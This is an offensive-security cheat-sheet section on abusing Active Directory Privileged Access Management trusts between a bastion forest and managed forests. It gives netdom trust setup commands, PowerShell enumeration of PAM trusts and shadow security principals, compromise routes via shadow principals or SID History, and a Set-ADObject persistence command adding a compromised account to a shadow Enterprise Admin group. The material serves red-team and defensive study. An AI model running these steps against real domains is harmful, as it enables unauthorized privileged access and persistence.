# Trust - Privileged Access Management 

> PAM (Privileged Access Management) introduces bastion forest for management, Shadow Security Principals (groups mapped to high priv groups of managed forests). These allow management of other forests without making changes to groups or ACLs and without interactive logon.

Requirements: 
* Windows Server 2016 or earlier   

If we compromise the bastion we get `Domain Admins` privileges on the other domain

* Default configuration for PAM Trust
    ```ps1
    # execute on our forest
    netdom trust lab.local /domain:bastion.local /ForestTransitive:Yes 
    netdom trust lab.local /domain:bastion.local /EnableSIDHistory:Yes 
    netdom trust lab.local /domain:bastion.local /EnablePIMTrust:Yes 
    netdom trust lab.local /domain:bastion.local /Quarantine:No
    # execute on our bastion
    netdom trust bastion.local /domain:lab.local /ForestTransitive:Yes
    ```
* Enumerate PAM trusts
    ```ps1
    # Detect if current forest is PAM trust
    Import ADModule
    Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}

    # Enumerate shadow security principals 
    Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl

    # Enumerate if current forest is managed by a bastion forest
    # Trust_Attribute_PIM_Trust + Trust_Attribute_Treat_As_External
    Get-ADTrust -Filter {(ForestTransitive -eq $True)} 
    ```
* Compromise
    * Using the previously found Shadow Security Principal (WinRM account, RDP access, SQL, ...)
    * Using SID History
* Persistence
  ```ps1
  # Add a compromised user to the group 
  Set-ADObject -Identity "CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=domain,DC=local" -Add @{'member'="CN=Administrator,CN=Users,DC=domain,DC=local"}
  ```